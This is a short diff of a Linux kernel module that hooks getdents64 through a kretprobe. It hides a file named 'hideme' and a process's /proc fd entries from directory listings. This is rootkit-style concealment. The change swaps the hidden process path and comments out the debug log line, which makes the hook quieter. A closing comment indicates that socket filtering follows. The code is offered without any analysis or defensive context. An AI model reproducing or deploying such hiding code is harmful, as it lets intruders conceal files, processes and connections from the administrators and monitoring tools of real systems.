@@ -12,7 +12,7 @@
 
 /// const file name to hide
 const char* hide_file_name = "hideme";
-const char* hide_pid_path = "/8125/fd";
+const char* hide_pid_path = "/4361/fd";
 
 
 typedef bool (*entry_filter_t)(struct linux_dirent64*, void* data);
@@ -75,7 +75,7 @@ static int handle_post(struct kretprobe_instance *ri, struct pt_regs *regs)
     unsigned long new_size = hide_entry(args->buffer_ptr, buffer_count, hide_entry_by_name, (void*)hide_file_name);
     regs_set_return_value(regs, new_size);
 
-    pr_info("getdents64 (fd=%d, buffer=%ld, count=%d) = %ld\n", args->fd, (unsigned long) args->buffer_ptr, args->count, buffer_count);
+    //pr_info("getdents64 (fd=%d, buffer=%ld, count=%d) = %ld\n", args->fd, (unsigned long) args->buffer_ptr, args->count, buffer_count);
 
     // filter socket
     char fd_path[256];
